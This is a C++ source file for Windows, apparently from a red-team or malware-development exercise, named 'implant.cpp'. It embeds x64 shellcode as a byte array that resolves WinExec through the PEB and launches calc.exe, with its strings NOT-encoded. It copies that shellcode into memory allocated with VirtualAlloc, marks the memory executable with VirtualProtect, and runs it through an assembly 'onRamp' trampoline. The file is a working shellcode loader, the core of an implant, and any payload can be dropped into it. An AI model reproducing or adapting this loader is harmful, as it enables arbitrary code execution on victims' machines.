#include <stdio.h>
#include <Windows.h>

// nasm -f win64 ramp.asm -o ramp.o
// x86_64-w64-mingw32-g++.exe implant.cpp ramp.o -o implant.exe -masm=intel

/* Reference
asm ( "assembly code"
           : output operands                  optional
           : input operands                   optional
           : list of clobbered registers      optional
);
*/

extern "C" void onRamp(PVOID exec_mem, PVOID ret_addr);

int main(void){
	
	DWORD oldprotect = 0x0;
	
	// payload: custom calc payload
	BYTE payload[] = {
	0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58, 0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48,
	0x8B, 0x5B, 0x20, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49, 0x89, 0xD8,
	0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1,
	0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44, 0x8B, 0x52, 0x1C, 0x4D,
	0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,
	0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x31, 0x59, 0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2, 0x51,
	0x48, 0x8B, 0x0C, 0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01, 0xC7, 0x48, 0x89,
	0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF, 0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04, 0x44,
	0x41, 0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0xEB, 0x1B, 0x48, 0x31, 0xC9, 0x80, 0xC1, 0x07, 0x48,
	0xB8, 0x0F, 0xA8, 0x96, 0x91, 0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8, 0x08,
	0x50, 0x51, 0xEB, 0xB4, 0x49, 0x89, 0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7, 0xE1, 0x50, 0x48, 0xB8,
	0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7, 0xD0, 0x50, 0x48, 0x89, 0xE1, 0x48,
	0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0x37, 0x41, 0xFF, 0xE6
};
	
	auto payload_len = sizeof(payload);
	
	// allocate memory
	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// move memory
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	//modify permissions
	auto rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("Implant running...\n");
	
	PVOID ret_addr = NULL;
	asm("lea %0, [rip+ReturnHere];"
	: "=r" (ret_addr) 								// ret_addr <- rip+ReturnHere
	:												// no inputs
	: 												// no predefined clobbers
	);
	
	printf("Executing payload...\n");
	getchar();
	onRamp(exec_mem, ret_addr);						// get on the ramp
	
	asm("ReturnHere:;");							// ret_addr
	printf("Exiting implant...\n");
	
	getchar();										// quasi break point
	

}


// nasm -f win64 payload.asm -o payload.o
// nasm -f win64 ramp.asm -o ramp.o
// x86_64-w64-mingw32-g++.exe implant.cpp -o implant.exe -masm=intel